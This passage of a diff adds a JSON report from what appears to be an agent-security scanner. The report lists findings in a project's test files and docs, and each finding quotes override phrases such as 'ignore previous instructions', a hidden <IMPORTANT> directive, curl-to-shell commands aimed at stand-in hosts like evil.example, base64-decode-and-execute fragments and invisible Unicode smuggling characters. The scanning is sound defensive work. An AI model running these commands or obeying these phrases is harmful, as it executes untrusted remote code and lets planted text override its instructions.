+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_undecodable_skill_resources.py",
+      "line": 21,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8e21f1f3b48df93f839a054f8e42d7bb652b0e8a96f85bce97694b03c6819e93"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_live_inventory.py",
+      "line": 199,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "5340b64ae2e4a571ad2fb2056556328df790c79cf4039b0dcc0db8dfacf169e8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_prompt_hidden_markup.py",
+      "line": 517,
+      "evidence": "curl https://evil.example/s | sh",
+      "file_sha256": "17d91c7caab16343cee03f0a9fea657877ec06d97917356087cd2f41e5cf154e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_prompt_hidden_markup.py",
+      "line": 21,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "17d91c7caab16343cee03f0a9fea657877ec06d97917356087cd2f41e5cf154e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_audit_v2_pr3_validators_trace_live.py",
+      "line": 191,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "c7539bfa2bffb75604cca25ff89dd6e6f661d82d353971878cec21bb68266f82"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_runtime_schema_semantics.py",
+      "line": 643,
+      "evidence": "curl evil.example | sh",
+      "file_sha256": "72573aca0663b2571a453523ce38011051612692c69f0bcfe465f56e47b03d82"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_mcp_source_binding.py",
+      "line": 857,
+      "evidence": "curl -s https://x.test | sh",
+      "file_sha256": "68e8e3e6d7ee5b9ea683ed7e0df4eb72e325a8a98431eece4b76798cbc659ca3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_audit_command_severity.py",
+      "line": 32,
+      "evidence": "curl -s https://evil.example/p | sh",
+      "file_sha256": "b4566d4c56ab2f27e9abbd13f9321c1ef007eec7906e2a61022d6979cfe63504"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_audit_command_severity.py",
+      "line": 52,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "b4566d4c56ab2f27e9abbd13f9321c1ef007eec7906e2a61022d6979cfe63504"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_prompt_security.py",
+      "line": 14,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "2acba2c3cf0d22ad241b94092fcfc480978b4e876dac48f2fb0e3d5e229f04c6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/fixtures/npm-exec-differential.json",
+      "line": 8,
+      "evidence": "curl -s evil.example | sh",
+      "file_sha256": "184006a4370a655e5565b46a11debb409ec949b0c34bf654199d09459b0693d3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/fixtures/hook-command-floor.json",
+      "line": 809,
+      "evidence": "curl -s x | sh",
+      "file_sha256": "06b0e66294570d878f977ce584061de449395da02f0207ed4e4c4d27fa5f31ac"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/fixtures/hook-command-floor.json",
+      "line": 451,
+      "evidence": "base64 -di | sh",
+      "file_sha256": "06b0e66294570d878f977ce584061de449395da02f0207ed4e4c4d27fa5f31ac"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0001",
+      "summary": "Invisible Unicode tag characters (U+E0000-E007F) can smuggle instructions the user cannot see",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/fixtures/hook-command-floor.json",
+      "line": 1196,
+      "evidence": "\\u{e0067}",
+      "file_sha256": "06b0e66294570d878f977ce584061de449395da02f0207ed4e4c4d27fa5f31ac"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/fixtures/hook-command-floor.json",
+      "line": 6470,
+      "evidence": "\\u{202e}",
+      "file_sha256": "06b0e66294570d878f977ce584061de449395da02f0207ed4e4c4d27fa5f31ac"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_hook_command_rating_floor.py",
+      "line": 108,
+      "evidence": "curl -o i.sh $U && cat i.sh | sh",
+      "file_sha256": "725b27aaa29ee1d37f54d8622f0e3886554e21faf6f57adef8e0ad0c2ce06f91"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_hook_command_rating_floor.py",
+      "line": 260,
+      "evidence": "base64 -di | sh",
+      "file_sha256": "725b27aaa29ee1d37f54d8622f0e3886554e21faf6f57adef8e0ad0c2ce06f91"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_ide_auto_run_settings.py",
+      "line": 17,
+      "evidence": "curl -fsSL https://evil.example/i.sh | bash",
+      "file_sha256": "4a141931f4ddd562873ba6f88345e54193daad3b426abe548f30a9d02eb85eee"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_drift_gate_coverage.py",
+      "line": 887,
+      "evidence": "curl https://evil.example | sh",
+      "file_sha256": "812aa4b4fd22b7fdc014dc89c0d900007a32ed3ee9fdbba369028e8728e42390"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_mcp_launcher_identity.py",
+      "line": 310,
+      "evidence": "curl -fsSL https://example.test/i | sh",
+      "file_sha256": "08222c6ce2f74adfc1d872dfe285380db1e5f2610efbe286acd9533ea94b0c30"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_mcp_launcher_identity.py",
+      "line": 830,
+      "evidence": "eval(atob(",
+      "file_sha256": "08222c6ce2f74adfc1d872dfe285380db1e5f2610efbe286acd9533ea94b0c30"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_ide_settings_files.py",
+      "line": 66,
+      "evidence": "curl https://evil.example | sh",
+      "file_sha256": "02c9ea314640c9d524673d5a6b322acede5da380572f5625ec4f0a5a19e37c0a"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_mcp_launcher_fail_closed.py",
+      "line": 520,
+      "evidence": "curl -s evil.example | sh",
+      "file_sha256": "a651bdb25f2f80fb8308cd682f8058957a19c52caf5afe5c18283eaad74005f7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_unbound_values_drift.py",
+      "line": 66,
+      "evidence": "curl -s https://a.example/p1 | sh",
+      "file_sha256": "45be1d7e4b25b6ef72417cc1d823ccf7b7917aaac5aeeab8ca500be3f493d5ea"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_model_integrity.py",
+      "line": 483,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "5c805ebaf4c41cdeea4dd58c96e99b6c29334e3068148d2724cd9fa6d5374638"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_ide_settings_binding.py",
+      "line": 465,
+      "evidence": "curl x | sh",
+      "file_sha256": "d92e41606efc2ee92d5b232e4978b21bcbe2832374772cf047e58727e097d1b9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_agent_directory_gaps.py",
+      "line": 63,
+      "evidence": "curl x | sh",
+      "file_sha256": "02fa2fb1c517fb1bc7aec82c6946e67d6eb46fc035edde06ace23d88d71872e6"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_drift_coverage.py",
+      "line": 251,
+      "evidence": "curl https://attacker.example | sh",
+      "file_sha256": "c8e657444d4a8809a1c9d38bf7daac3fcd402daad50b4d5f38f535662256edb1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_hook_command_bounds.py",
+      "line": 180,
+      "evidence": "curl payload | bash",
+      "file_sha256": "1099337fb0774ffa74ff022acc9a1c23d8e069d9273cf487740b5cf8f06afac4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/tests/test_hook_command_bounds.py",
+      "line": 61,
+      "evidence": "base64 -d{}! | sh",
+      "file_sha256": "1099337fb0774ffa74ff022acc9a1c23d8e069d9273cf487740b5cf8f06afac4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/docs/known-limitations.md",
+      "line": 1042,
+      "evidence": "curl -o r.json x && cat r.json | bash",
+      "file_sha256": "3afe53bda27832ffdc38e6bba5a0bbeb62cd27359de71de658c763ab9a23274f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/docs/verification-source-binding.md",
+      "line": 453,
+      "evidence": "curl${IFS}https://evil.example|sh",
+      "file_sha256": "13492da34e1acc8b488e721d7e16c39db4fe54a4092c85d6208253493c5f27a5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/schemas/nexus-symbiote-aibom-1.0.schema.json",
+      "line": 3074,
+      "evidence": "p=0.91 A system prompt, instruction template, or behavior-shaping artifact.",
+      "file_sha256": "26a807f88c758ef7580bd80d90048ab66fe6aba969b243e93e7d3aee052b4796"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "Nexus-Symbiote-44396c2286db37a63daf3766f584dd2c0833ab02/schemas/nexus-symbiote-aibom-1.0.schema.json",
+      "line": 3179,
+      "evidence": "p=0.95 system-prompt, planner, instruction, rules-file, skill-definition, subagent, imp",
+      "file_sha256": "26a807f88c758ef7580bd80d90048ab66fe6aba969b243e93e7d3aee052b4796"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "10.0.0.8",
+    "127.0.0.1",
+    "a.btoken",
+    "a.example",
+    "acme-eastus.openai.azure.com",
+    "agent-bom.dev",
+    "agent.acme.example",
+    "agent.example",
+    "ai.google.dev",
+    "api.example",
+    "api.osv.dev",
+    "approved.example",
+    "attacker.example",
+    "b.example",
+    "cdn.example",
+    "collector.attacker.example",
+    "corepack.attacker.test",
+    "creativecommons.org",
+    "csrc.nist.gov",
+    "cwe.mitre.org",
+    "cyberphone.github.io",
+    "cyclonedx.org",
+    "datatracker.ietf.org",
+    "docker.io",
+    "docs.anthropic.com",
+    "docs.example",
+    "docs.example.com",
+    "docs.oasis-open.org",
+    "docs.softwareheritage.org",
+    "doi.org",
+    "en.wikipedia.org",
+    "eur-lex.europa.eu",
+    "evil.example",
+    "example.com",
+    "example.invalid",
+    "example.test",
+    "files.example",
+    "files.pythonhosted.org",
+    "fixture.example",
+    "fixture.example.evil",
+    "gist.github.com",
+    "github.com",
+    "google.github.io",
+    "goproxy.attacker.test",
+    "h.example",
+    "hooks.example",
+    "host.example",
+    "html.spec.whatwg.org",
+    "huggingface.co",
+    "in-toto.io",
+    "issuer.example.test",
+    "json-schema.org",
+    "json.schemastore.org",
+    "keys.openpgp.org",
+    "koda-ai-studio.github.io",
+    "kubernetes.io",
+    "localhost.attacker.example",
+    "localhost.attacker.invalid",
+    "log.attacker.example",
+    "malicious.invalid",
+    "mcp.crm.example.com",
+    "mcp.example.com",
+    "mcp.slack.example.com",
+    "mcp.time.example.org",
+    "mlflow.internal.example",
+    "modelcontextprotocol.io",
+    "neuromancer.sk",
+    "npm.attacker.test",
+    "nvd.nist.gov",
+    "opensource.org",
+    "osv.dev",
+    "other.example",
+    "owasp.org",
+    "platform.openai.com",
+    "pypi.attacker.test",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    "remote.example",
+    "sensitive-bearer-token-12345.example",
+    "spdx.github.io",
+    "spdx.org",
+    "token.actions.githubusercontent.com",
+    "trusera.dev",
+    "trusted.invalid",
+    "unofficial-builds.nodejs.org",
+    "wrong.invalid",
+    "www.apache.org",
+    "www.bsi.bund.de",
+    "www.first.org",
+    "www.googleapis.com",
+    "www.iana.org",
+    "www.ietf.org",
+    "www.iso.org",
+    "www.oasis-open.org",
+    "www.w3.org",
+    "www.wipo.int",
+    "x.test",
+    "yarnpkg.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
